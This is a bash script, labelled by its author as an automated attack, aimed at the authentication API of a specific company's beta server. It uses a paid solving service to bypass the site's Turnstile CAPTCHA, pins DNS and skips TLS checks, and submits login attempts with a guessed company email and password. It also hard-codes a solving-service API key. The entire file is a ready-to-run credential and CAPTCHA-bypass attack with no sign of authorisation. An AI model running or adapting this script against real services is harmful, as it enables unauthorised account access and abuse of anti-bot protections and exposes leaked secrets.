#!/bin/bash
# Automated 2Captcha + API attack
# Usage: ./captcha_attack.sh [email] [password] [action]
#   action: email (default), login, both

set -e

CAPTCHA_KEY="3ff6b7b981be450b1cc93d846be77934"
SITEKEY="0x4AAAAAACKSTFyIPdWMxVoP"
API_BETA="https://api-beta.stormapplications.com"
RESOLVE_IP="75.2.96.173"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"

get_turnstile() {
    echo "[*] Submitting to 2Captcha..." >&2
    SUBMIT=$(curl -s "https://2captcha.com/in.php?key=$CAPTCHA_KEY&method=turnstile&sitekey=$SITEKEY&pageurl=https://api-beta.stormapplications.com/auth/login&json=1")
    REQ_ID=$(echo "$SUBMIT" | python3 -c "import sys,json; print(json.load(sys.stdin).get('request',''))")
    echo "[*] Request ID: $REQ_ID" >&2
    
    for i in $(seq 1 30); do
        sleep 3
        RESULT=$(curl -s "https://2captcha.com/res.php?key=$CAPTCHA_KEY&action=get&id=$REQ_ID&json=1")
        STATUS=$(echo "$RESULT" | python3 -c "import sys,json; print(json.load(sys.stdin).get('status',0))")
        if [ "$STATUS" = "1" ]; then
            TOKEN=$(echo "$RESULT" | python3 -c "import sys,json; print(json.load(sys.stdin).get('request',''))")
            echo "$TOKEN"
            return 0
        fi
        echo "[*] Poll $i: $RESULT" >&2
    done
    echo "[-] FAILED" >&2
    return 1
}

echo "=============================================="
echo " StorM Applications - 2Captcha Auth Attack"
echo " Date: $(date -u '+%Y-%m-%d %H:%M:%S')Z"
echo "=============================================="

# Get fresh token
echo "[*] Step 1: Getting Turnstile token..."
TOKEN=$(get_turnstile)
echo "[+] Turnstile token: ${TOKEN:0:50}..."

ACTION="${3:-email}"

if [ "$ACTION" = "email" ] || [ "$ACTION" = "both" ]; then
    EMAIL="${1:-test$(date +%s)@temp.com}"
    echo ""
    echo "[*] Step 2: Testing /auth/email with $EMAIL"
    
    RESP=$(curl -sk --resolve api-beta.stormapplications.com:443:$RESOLVE_IP \
        -X POST "$API_BETA/auth/email" \
        -H "Authorization: Bearer test" \
        -H "User-Agent: $UA" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$EMAIL\",\"turnstile\":\"$TOKEN\"}" 2>&1)
    echo "[*] Response: $RESP"
fi

if [ "$ACTION" = "login" ] || [ "$ACTION" = "both" ]; then
    EMAIL="${1:-contato@stormapplications.com}"
    PASSWORD="${2:-StorM2024}"
    echo ""
    echo "[*] Step 3: Testing /auth/login with $EMAIL:$PASSWORD"
    
    # Get fresh token for login
    TOKEN=$(get_turnstile)
    
    RESP=$(curl -sk --resolve api-beta.stormapplications.com:443:$RESOLVE_IP \
        -X POST "$API_BETA/auth/login" \
        -H "Authorization: Bearer test" \
        -H "User-Agent: $UA" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$EMAIL\",\"password\":\"$PASSWORD\",\"turnstile\":\"$TOKEN\"}" 2>&1)
    echo "[*] Response: $RESP"
fi